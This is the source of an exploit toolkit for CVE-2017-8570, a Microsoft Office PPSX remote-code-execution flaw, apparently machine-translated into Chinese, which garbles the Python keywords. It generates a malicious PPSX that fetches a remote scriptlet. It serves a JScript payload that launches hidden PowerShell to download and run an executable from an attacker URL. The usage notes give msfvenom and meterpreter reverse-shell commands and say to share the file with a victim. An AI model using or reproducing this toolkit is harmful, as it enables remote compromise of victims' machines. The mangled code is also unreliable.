＃！/ usr / bin / env python
“””
                                                        ## Exploit工具包CVE-2017-8570  -  v1.0（https://github.com/bhdresh/CVE-2017-8570）##
###情景1：提供本地有效载荷
示例命令
1）生成恶意PPSX文件
    ＃python cve-2017-8570_toolkit.py -M gen -w Invoice.ppsx -u http://192.168.56.1/logo.doc
2）（可选，如果使用MSF Payload）：生成metasploit负载和启动处理程序
    ＃msfvenom -p windows / meterpreter / reverse_tcp LHOST = 192.168.56.1 LPORT = 4444 -f exe> /tmp/shell.exe
    ＃msfconsole -x“使用multi / handler;设置PAYLOAD windows / meterpreter / reverse_tcp;设置LHOST 192.168.56.1;运行”
3）以exploit模式启动工具包以提供本地有效负载
    ＃python cve-2017-8570_toolkit.py -M exp -e http://192.168.56.1/shell.exe -l /tmp/shell.exe
###情景2：提供远程有效负载
示例命令
1）生成恶意PPSX文件
    ＃python cve-2017-8570_toolkit.py -M gen -w Invoice.ppsx -u http://192.168.56.1/logo.doc
2）以exploit模式启动工具包以提供远程负载
    ＃python cve-2017-8570_toolkit.py -M exp -e http://remoteserver.com/shell.exe
方案3：交付自定义SCT文件
示例命令
1）生成恶意PPSX文件
    ＃python cve-2017-8570_toolkit.py -M gen -w Invoice.ppsx -u http://192.168.56.1/logo.doc
2）以exploit模式启动工具包以提供自定义SCT文件
    ＃python cve-2017-8570_toolkit.py -M exp -H /tmp/custom.sct
    
###命令行参数：
    ＃python cve-2017-8570_toolkit.py -h
    这是一个方便的工具包来利用CVE-2017-8570（Microsoft Office PPSX RCE）
    模式：
    -M gen仅生成恶意PPSX文件
         生成恶意PPSX文件：
          -w <Filename.ppsx>恶意PPSX文件的名称（与受害者共享此文件）。
          -u <http://attacker.com/test.sct> SCT文件的路径。通常，这应该是运行此工具的域或IP。
                                              例如，http://attackerip.com/test.sct（该URL将被包含在恶意PPSX文件中
                                              一旦受害者将会打开恶意的PPSX文件就会被请求。
    -M exp启动开发模式
         开发：
	  -H </tmp/custom.sct>需要在目标上传递和执行的自定义SCT文件的本地路径。
	                                      注意：此选项不会传递通过选项“-e”和“-l”指定的有效载荷。
          -p <TCP端口：默认80>本地端口号。
          -e <http://attacker.com/shell.exe>需要在目标上执行的可执行文件/ meterpreter shell / payload的路径。
          -l </tmp/shell.exe>如果有效负载在本地托管，请指定可执行文件/ meterpreter外壳程序/有效内容的本地路径。
          
“””

import os，sys，线程，套接字，sys，getopt，binascii，shutil，tempfile
从随机导入 randint
从随机进口选择
从字符串导入 ascii_uppercase
从 zipfile 导入 ZipFile，ZIP_STORED，ZipInfo


BACKLOG  =  50             ＃有多少挂起的连接队列可以容纳
MAX_DATA_RECV  =  999999   ＃我们一次收到的最大字节数
DEBUG  =  True             ＃设置为True以查看调试信息
def  main（argv）：
    ＃主机和端口信息
    全球港口
    全球主机
    全局文件名
    全球 docuri
    全球有效载荷
    全球有效载荷位置
    全球通关
    全局模式
    全球混淆
    filename =  ' '
    docuri =  ' '
    payloadurl =  ' '
    payloadlocation =  ' '
    customsct =  ' '
    port =  int（“ 80 ”）
    host =  ' '
    mode =  ' '
    obfuscate =  int（“ 0 ”）
    ＃捕获命令行参数
    尝试：
        opts，args = getopt.getopt（argv，“ hM：w：u：p：e：l：H：x：”，[ “ mode = ”，“ filename = ”，“ docuri = ”，“ port = ”，“ payloadurl = ”，“ payloadlocation = ”，“ customsct = ”，“ obfuscate = ” ]）
    getopt.GetoptError 除外：
        print  '用法：python ' + sys.argv [ 0 ] + '- h '
        sys.exit（2）
    对于选择，精氨酸在 OPTS：
        if opt ==  '- h '：
                打印 “ \ n这是一个方便使用CVE-2017-8570（Microsoft Word PPSX RCE）的工具包\ n ”
                打印 “模式：\ n ”
                打印 “ -M gen仅生成恶意PPSX文件\ n ”
                打印 “              生成恶意PPSX文件：\ n ”
                打印 “              -w <Filename.ppsx>恶意PPSX文件的名称（与受害者共享此文件）。\ n ”
                打印 “              -u <http://attacker.com/test.sct> SCT文件的路径通常，这应该是运行此工具的域或IP。\ n ”
                打印 “                                                  例如，http://attackerip.com/test.sct（此URL将包含在恶意PPSX文件中，\ n ”
                打印 “                                                  将被要求，一旦受害者将打开恶意PPSX文件。\ n ”
                打印 “ -M exp启动开发模式\ n ”
                打印 “              开发：\ n ”
		打印 “              -H </tmp/custom.sct>需要在目标上传递和执行的自定义SCT文件的本地路径。\ n ”
                打印 “                                                  注意：此选项不会传递通过选项\”- e \“和\”- l \“指定的有效载荷。\ n ”
		打印 “              -p <TCP端口：默认80>本地端口号。\ n ”
                打印 “              -e <http://attacker.com/shell.exe>需要在目标上执行的可执行文件/ meterpreter外壳/有效内容的路径。\ n ”
                打印 “              -l </tmp/shell.exe>如果有效载荷在本地托管，请指定可执行文件/ meterpreter外壳/有效内容的本地路径。\ n ”
                sys.exit（）
        elif opt in（“- M ”，“ --mode ”）：
            mode = arg
        elif opt in（“- w ”，“-- filename ”）：
            filename = arg
        elif opt in（“ -u ”，“-- docuri ”）：
            docuri = arg
        elif opt in（“- p ”，“-- port ”）：
            port =  int（arg）
        elif opt in（“- e ”，“-- payloadurl ”）：
            payloadurl = arg
        elif opt in（“- l ”，“-- payloadlocation ”）：
            payloadlocation = arg
	elif opt in（“- H ”，“-- customsct ”）：
            customsct   = arg
    如果 “根” 的模式：
        if（len（filename）< 1）：
            print  '用法：python ' + sys.argv [ 0 ] + '- h '
            sys.exit（）
        if（len（docuri）< 1）：
            print  '用法：python ' + sys.argv [ 0 ] + '- h '
            sys.exit（）
	generate_exploit_ppsx（）
        mode =  '完成'
    如果 在模式中“ exp ” ：
	如果（len（海关）> 1）：
	    打印 “运行漏洞利用模式（交付自定义SCT） - 等待受害者连接”
            开发（）
	    sys.exit（）
        if（len（payloadurl）< 1）：
            print  '用法：python ' + sys.argv [ 0 ] + '- h '
            sys.exit（）
        if（len（payloadurl）> 1  和 len（payloadlocation）< 1）：
            打印 “运行漏洞利用模式（将SCT与远程负载交付） - 等待受害者连接”
            开发（）
            sys.exit（）
        打印 “运行漏洞利用模式（交付SCT +本地负载） - 等待受害者连接”
        开发（）
        mode =  '完成'
    如果 没有 “完成” 的模式：
        print  '用法：python ' + sys.argv [ 0 ] + '- h '
        sys.exit（）
def  generate_exploit_ppsx（）：
＃准备恶意PPSX
	shutil.copy2（' template / template.ppsx '，文件名）
	类 UpdateableZipFile（ZipFile）：
	    “””
	    添加删除（通过remove_file）和更新（通过写入和写入方法）
	    要启用更新功能，请使用UpdateableZipFile和'with statement'，
	    在__exit__之后（如果应用了更新），新的压缩文件将使用更新覆盖正在退出的压缩文件
	    “””

	    类 DeleteMarker（object）：
		通过

	    def  __init__（self，file，mode = “ r ”，compression = ZIP_STORED，allowZip64 = False）：
		＃初始基地
		超级（UpdateableZipFile，self）。__init__（文件，模式=模式，
		                                        压缩=压缩，
		                                        allowZip64 = allowZip64）
		＃追踪文件以覆盖zip
		self ._replace = {}
		＃是否声明被调用
		self ._allow_updates =  False

	    def  writestr（self，zinfo_or_arcname，bytes，compress_type = None）：
		如果 isinstance（zinfo_or_arcname，ZipInfo）：
		    name = zinfo_or_arcname.filename
		其他：
		    name = zinfo_or_arcname
		＃如果文件退出并需要重写，
		＃标记条目，并为其创建一个临时文件
		＃只有在使用with语句时，我们才允许这样做
		如果 自我 ._allow_updates 和名称在 自我 .namelist（）：
		    temp_file =  自 ._replace [名称] =  自 ._replace.get（姓名，
		                                                        tempfile.TemporaryFile（））
		    temp_file.write（字节）
		＃否则只是正常行事
		其他：
		    超级（UpdateableZipFile，self）.writestr（zinfo_or_arcname，
		                                            字节，compress_type = compress_type）

	    def  write（self，filename，arcname = None，compress_type = None）：
		arcname = arcname 或文件名
		＃如果文件退出并需要重写，
		＃标记条目，并为其创建一个临时文件
		＃只有在使用with语句时，我们才允许这样做
		如果 自我 ._allow_updates 和 arcname 在 自我 .namelist（）：
		    temp_file =  自 ._replace [arcname] =  自 ._replace.get（arcname，
		                                                           tempfile.TemporaryFile（））
		    与 开放（文件名，“ rb ”）作为来源：
		        shutil.copyfileobj（source，temp_file）
		＃否则只是正常行事
		其他：
		    超级（UpdateableZipFile，self）.write（文件名，
		                                         arcname = arcname，compress_type = compress_type）

	    def  __enter__（self）：
		＃允许更新
		self ._allow_updates =  True
		回归 自我

	    def  __exit__（self，exc_type，exc_val，exc_tb）：
		＃呼叫基地关闭ZIP文件，有机
		尝试：
		    超级（UpdateableZipFile，self）。__exit__（exc_type，exc_val，exc_tb）
		    如果 len（self ._replace）>  0：
		        self ._rebuild_zip（）
		最后：
		    ＃如果重建压缩失败，
		    ＃确保仍然释放所有临时文件
		    self ._close_all_temp_files（）
		    self ._allow_updates =  False

	    def  _close_all_temp_files（self）：
		对于 temp_file 在 自我 ._replace.itervalues（）：
		    如果 hasattr（temp_file，' close '）：
		        temp_file.close（）

	    def  remove_file（self，path）：
		self ._replace [path] =  self .DeleteMarker（）

	    def  _rebuild_zip（self）：
		tempdir = tempfile.mkdtemp（）
		尝试：
		    temp_zip_path = os.path.join（tempdir，' new.zip '）
		    用的ZipFile（自 .filename，' - [R '）作为 zip_read：
		        ＃使用分配的属性创建新的zip文件
		        与 ZipFile（temp_zip_path，' w '，compression = self .compression，
		                     allowZip64 = self ._allowZip64）作为 zip_write：
		            对于项目在 zip_read.infolist（）：
		                ＃检查文件是否应该被替换/删除
		                replacement =  self ._replace.get（item.filename，None）
		                ＃如果标记为删除，请勿将文件复制到新的zip文件
		                如果 isinstance（替换，自我 .DeleteMarker）：
		                    del  self ._replace [item.filename]
		                    继续
		                ＃如果标记为替换，请复制temp_file而不是旧文件
		                ELIF更换是 不 无：
		                    del  self ._replace [item.filename]
		                    ＃将替代文件写入存档，
		                    ＃然后关闭它（删除临时文件）
		                    replacement.seek（0）
		                    data = replacement.read（）
		                    replacement.close（）
		                其他：
		                    data = zip_read.read（item.filename）
		                zip_write.writestr（item，data）
		    ＃用更新的覆盖档案
		    shutil.move（temp_zip_path，self .filename）
		最后：
		    shutil.rmtree（TEMPDIR）
	
	与 UpdateableZipFile（文件名，“ a ”）作为 o：
	    o.writestr（“ ppt / slides / _rels / slide1.xml.rels ”，“ <？xml version = \” 1.0 \“ encoding = \” UTF-8 \“ standalone = \” yes \“？> \
	< Relationships xmlns = \ “http://schemas.openxmlformats.org/package/2006/relationships\" >< Relationship Id = \”rId3 \“Type = \”http://schemas.openxmlformats.org/officeDocument/2006 / relationships / oleObject \“Target = \”script：“+ docuri +”\“TargetMode = \”External \“/> <Relationship Id = \”rId2 \“Type = \”http://schemas.openxmlformats.org/ officeDocument / 2006 / relationships / slideLayout \“Target = \”../ slideLayouts / slideLayout1.xml \“/> <Relationship Id = \”rId1 \“Type = \”http://schemas.openxmlformats.org/officeDocument/ 2006 / relationships / vmlDrawing \“Target = \”../ drawings / vmlDrawing1.vml \“/> </ Relationships>”）
	打印 “生成” +文件名+ “成功”

def explo（）：
 
    打印 “服务器正在运行”，主机，“：”，端口

    尝试：
        ＃创建一个套接字
        s  = socket.socket（套接字AF_INET，套接字SOCK_STREAM）

        ＃将套接字关联到主机和端口
        s.bind（（host，port））

        ＃倾听
        s.listen（BACKLOG）
    
    除了 socket.error，（值，消息）：
        如果 s：
            S.CLOSE（）
        打印 “无法打开套接字：”，消息
        sys.exit（1）

    ＃从客户端获取连接
    而 1：
        conn，client_addr  = s.accept（）

        ＃创建一个线程来处理请求
        thread.start_new_thread（server_thread，（conn，client_addr））
        
    S.CLOSE（）

def server_thread（conn，client_addr）：

    ＃从浏览器获取请求
    尝试：
        request  = conn.recv（MAX_DATA_RECV）
        if（len（request）>  0）：
            ＃解析第一行
            first_line  = request.split（' \ n '）[ 0 ]
            
            ＃ get方法
            method  = first_line.split（'  '）[ 0 ]
            ＃获取网址
            尝试：
                url  = first_line.split（'  '）[ 1 ]
             IndexError 除外：
                打印 “来自无效的请求” + client_addr [ 0 ]
                conn.close（）
                sys.exit（1）
 		＃检查是否设置了自定义SCT标志
	    如果（len（海关）> 1）：
                打印 “接收到自定义SCT的请求” + client_addr [ 0 ]
                尝试：
                    size  = os.path.getsize（customsct）
                除了 OSError：
                    打印 “无法读取自定义SCT文件 - ” + customsct
                    conn.close（）
                    sys.exit（1）
                data  =  “ HTTP / 1.1 200 OK \ r \ n日期：2017年4月16日18:56:41 GMT \ r \ n服务器：Apache / 2.4.25（Debian）\ r \ n上次修改时间：Sun，16 Apr 2017 16:56:22 GMT \ r \ n Accept-Ranges：bytes \ r \ n Content-Length：“ + str（size）+ ” \ r \ n Keep-Alive：timeout = 5，max = 100 \ r \ n连接：保持活动\ r \ n内容类型：文本/脚本\ r \ n \ r \ n “
                与 开放（海关）作为 fin：
                    data + = fin.read（）
                    conn.send（数据）
                    conn.close（）
                    sys.exit（1）
		conn.close（）
		sys.exit（1）
            check_exe_request  = url.find（'. exe '）
            如果（check_exe_request >  0）：
                打印 “接收到的有效载荷请求” + client_addr [ 0 ]
                尝试：
                    size  = os.path.getsize（payloadlocation）
                除了 OSError：
                    打印 “无法读取” + payloadlocation
                    conn.close（）
                    sys.exit（1）
                data  =  “ HTTP / 1.1 200 OK \ r \ n日期：2017年4月16日18:56:41 GMT \ r \ n服务器：Apache / 2.4.25（Debian）\ r \ n上次修改时间：Sun，16 Apr 2017 16:56:22 GMT \ r \ n Accept-Ranges：bytes \ r \ n Content-Length：“ + str（size）+ ” \ r \ n Keep-Alive：timeout = 5，max = 100 \ r \ n连接：保持活动\ r \ n内容类型：application / x-msdos-program \ r \ n \ r \ n “
                与 开放（payloadlocation）作为翅片：
                    data + = fin.read（）
                    conn.send（数据）
                    conn.close（）
                    sys.exit（1）
            如果方法在 [ ' GET '，'得到' ]：
                打印 “接收到的GET方法来自” + client_addr [ 0 ]
                data  =  “ HTTP / 1.1 200 OK \ r \ n日期：2017年4月16日17:11:03 GMT \ r \ n服务器：Apache / 2.4.25（Debian）\ r \ n上次修改时间：Sun，16 Apr 2017 17:30:47 GMT \ r \ n Accept-Ranges：bytes \ r \ n Content-Length：1000 \ r \ n Keep-Alive：timeout = 5，max = 100 \ r \ n Connection：Keep-Alive \ r \ n Content-Type：text / scriptlet \ r \ n \ r \ n <？XML version = \“ 1.0 \”？> \ r \ n <package> \ r \ n <component id ='giffile'> \ r \ n <registration \ r \ n   description ='Dummy'\ r \ n  progid ='giffile' \ r \ n   version ='1.00' \ r \ n   remotable ='True'> \ r \ n </ registration> \ r \ n <script language ='JScript'> \ r \ n <！ （CDATA [ \ r \ n   新ActiveXObject（'WScript.shell'）.exe（'％SystemRoot％/ system32 / WindowsPowerShell / v1.0 / powershell.exe -windowstyle hidden（new-object System.Net.WebClient）.DownloadFile （\\ ' “ + payloadurl + ” \\ '，\\ 'c：/windows/temp/shell.exe \\ '）; c：/windows/temp/shell.exe'）; \ r \ n ]]> \ r \ n </ script></ package> \ r \ n “
                conn.send（数据）
                conn.close（）
                sys.exit（1）
    除了 socket.error，例如：
        打印前
如果 __name__  ==  ' __main__ '：
    main（sys.argv [ 1：]）